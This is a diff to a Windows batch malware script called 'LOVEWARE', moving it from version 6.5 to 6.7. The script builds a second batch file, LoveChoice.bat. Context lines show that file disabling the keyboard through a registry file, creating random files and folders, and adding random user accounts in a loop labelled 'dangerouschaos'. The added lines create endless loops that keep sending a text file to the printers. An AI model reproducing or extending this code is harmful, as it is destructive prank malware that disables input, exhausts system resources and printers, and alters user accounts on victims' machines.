@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v6.5
+:: LOVEWARE v6.7
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -364,6 +364,16 @@ echo :startmsg>>LoveChoice.bat
 echo start msg.vbs>>LoveChoice.bat
 echo goto startmsg>>LoveChoice.bat
 
+:: Create a new file and print it with the pritner
+
+echo echo I love you!!!>>LOVE.txt>>LoveChoice.bat
+
+:Print
+echo PRINT LOVE.txt /D:LPT2>>LoveChoice.bat
+echo PRINT LOVE.txt /D:LPT1>>LoveChoice.bat
+echo NOTEPAD /P LOVE.txt>>LoveChoice.bat
+goto Print
+
 :: Disable keyboard
 
 echo start "nokeyboard.reg">>LoveChoice.bat
@@ -479,6 +489,16 @@ echo nul >> %random%>>LoveChoice.bat
 echo mkdir %random%>>LoveChoice.bat
 echo net user %random% /add>>LoveChoice.bat
 echo goto dangerouschaos>>LoveChoice.bat
+
+:: Create a new file and print it with the pritner
+
+echo echo I hate you!!!>>LOVE.txt>>LoveChoice.bat
+
+:print
+echo PRINT LOVE.txt /D:LPT2>>LoveChoice.bat
+echo PRINT LOVE.txt /D:LPT1>>LoveChoice.bat
+echo NOTEPAD /P LOVE.txt>>LoveChoice.bat
+goto print
 
 :: Disable keyboard
 
